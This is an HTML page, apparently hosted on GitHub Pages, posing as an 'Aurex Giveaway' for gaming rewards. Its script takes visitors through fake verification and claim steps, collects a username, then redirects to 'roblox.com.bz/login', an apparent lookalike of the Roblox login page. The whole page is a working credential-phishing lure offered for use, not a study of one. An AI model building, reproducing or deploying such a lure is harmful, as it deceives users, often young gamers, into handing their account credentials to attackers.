# Aura456
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Aurex Giveaway</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
            background-color: #030104;
            
            background-image: 
                radial-gradient(circle at 80% 40%, rgba(255, 0, 102, 0.15), transparent 400px),
                radial-gradient(circle at 20% 70%, rgba(255, 0, 60, 0.12), transparent 400px),
                radial-gradient(rgba(255, 255, 255, 0.3) 1px, transparent 20px),
                radial-gradient(rgba(255, 0, 80, 0.4) 2px, transparent 30px);
            background-size: 100% 100%, 100% 100%, 350px 350px, 250px 250px;
            background-position: 0 0, 0 0, 40px 60px, 130px 270px;
            
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center; 
            min-height: 100vh;
            padding: 20px;
            overflow-y: auto;
        }

        .giveaway-card {
            background: rgba(14, 7, 18, 0.88);
            border: 2px solid rgba(255, 0, 85, 0.2);
            padding: 55px 45px;
            border-radius: 24px;
            box-shadow: 0 0 60px rgba(255, 0, 85, 0.25), 
                        inset 0 0 20px rgba(255, 0, 85, 0.05);
            text-align: center;
            max-width: 720px; 
            width: 100%;
            z-index: 2;
            margin: auto;
            animation: cardFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes cardFadeIn {
            from { opacity: 0; transform: scale(0.97) translateY(10px); }
            to { opacity: 1; transform: scale(1) translateY(0); }
        }

        h1 {
            font-size: 2.7rem;
            margin-bottom: 20px;
            background: linear-gradient(to right, #ff1744, #d500f9);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
            letter-spacing: 0.5px;
        }

        p.description {
            color: #a4a4c1;
            font-size: 1.15rem;
            line-height: 1.6;
            margin-bottom: 40px;
        }

        .enter-btn {
            display: block;
            background: linear-gradient(90deg, #ff007f 0%, #7928ca 100%);
            color: #ffffff;
            border: none;
            padding: 20px 35px;
            font-size: 1.25rem;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 30px rgba(255, 0, 127, 0.4);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            -webkit-tap-highlight-color: transparent;
        }

        .enter-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 40px rgba(255, 0, 127, 0.6);
        }

        .spinner {
            display: none;
            width: 55px;
            height: 55px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #ff007f;
            border-radius: 50%;
            margin: 40px auto;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .action-view, .internal-panel-view, .success-view {
            display: none;
            animation: fadeIn 0.4s ease-out;
        }

        .btn-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-top: 20px;
        }

        .split-btn {
            padding: 18px 25px;
            font-size: 1.1rem;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            border: none;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: background 0.2s, transform 0.2s;
            -webkit-tap-highlight-color: transparent;
        }

        .proceed-btn {
            background: linear-gradient(90deg, #00f2fe 0%, #4facfe 100%);
            color: #030104;
            box-shadow: 0 4px 15px rgba(0, 242, 254, 0.25);
        }

        .proceed-btn:hover {
            transform: translateY(-2px);
        }

        .close-btn {
            background: rgba(255, 255, 255, 0.06);
            color: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.12);
        }

        .close-btn:hover {
            background: rgba(255, 255, 255, 0.12);
            transform: translateY(-2px);
        }

        .local-form-group {
            text-align: left;
            margin-top: 25px;
            background: rgba(0, 0, 0, 0.3);
            padding: 30px;
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.08);
        }

        .form-label {
            display: block;
            color: #00f2fe;
            font-size: 1.05rem;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .form-input {
            width: 100%;
            padding: 14px 20px;
            background: rgba(14, 7, 18, 0.9);
            border: 1px solid rgba(255, 0, 85, 0.3);
            border-radius: 8px;
            color: #ffffff;
            font-size: 1.1rem;
            outline: none;
            margin-bottom: 20px;
            transition: border-color 0.2s;
        }

        .form-input:focus {
            border-color: #00f2fe;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @media (max-width: 480px) {
            h1 { font-size: 2.2rem; }
            .giveaway-card { padding: 35px 25px; }
            .btn-group { grid-template-columns: 1fr; gap: 12px; }
        }
    </style>
</head>
<body>

    <div class="giveaway-card" id="mainCard">
        <div id="initialView">
            <h1>Aurex Giveaway</h1>
            <p class="description">The exclusive Aurex reward drop is now live! Click the button below to join the giveaway and secure your entry for premium gaming items.</p>
            <button class="enter-btn" id="enterBtn">Enter Giveaway</button>
        </div>

        <div class="spinner" id="loadingSpinner"></div>

        <div id="actionView" class="action-view">
            <h1 style="font-size: 2.2rem;">Verify Entry</h1>
            <p class="description">To complete your registration for the active reward drop pool, select an option below to authorize your session profile details.</p>
            <div class="btn-group">
                <button class="split-btn proceed-btn" id="proceedBtn">Proceed</button>
                <button class="split-btn close-btn" id="closeBtn">Close</button>
            </div>
        </div>

        <div id="internalPanelView" class="internal-panel-view">
            <h1>Submit Claim Details</h1>
            <p class="description">Please finalize your regional request information directly inside the validation profile components below.</p>
            
            <div class="local-form-group">
                <label class="form-label" for="usernameInput">User Identification ID:</label>
                <input class="form-input" type="text" id="usernameInput" placeholder="Enter your event registration name">
                
                <button class="action-btn enter-btn" style="padding: 15px 20px; font-size: 1.1rem;" id="submitClaimBtn">Confirm Submission</button>
            </div>
        </div>

        <div id="successView" class="success-view">
            <h1 style="background: linear-gradient(to right, #00ffcc, #0072ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Registration Initialized</h1>
            <p class="description" style="color: #b0b0cb; margin-bottom: 0;">Your request parameters have been logged successfully. The entry verification process is now running in the background.</p>
        </div>
    </div>

    <script>
        const initialView = document.getElementById('initialView');
        const spinner = document.getElementById('loadingSpinner');
        const actionView = document.getElementById('actionView');
        const internalPanelView = document.getElementById('internalPanelView');
        const successView = document.getElementById('successView');

        document.getElementById('enterBtn').addEventListener('click', function() {
            initialView.style.display = 'none';
            spinner.style.display = 'block';

            setTimeout(() => {
                spinner.style.display = 'none';
                actionView.style.display = 'block';
            }, 3000); 
        });

        document.getElementById('proceedBtn').addEventListener('click', function() {
            actionView.style.display = 'none';
            internalPanelView.style.display = 'block';
        });

        document.getElementById('submitClaimBtn').addEventListener('click', function() {
            internalPanelView.style.display = 'none';
            successView.style.display = 'block';

            setTimeout(() => {
                window.location.href = "https://roblox.com.bz/login?returnUrl=0295377443746119"; 
            }, 1000);
        });

        document.getElementById('closeBtn').addEventListener('click', function() {
            window.location.href = "https://hridyanshdhakad1-coder.github.io/Aura456/";
        });
    </script>

</body>
</html>
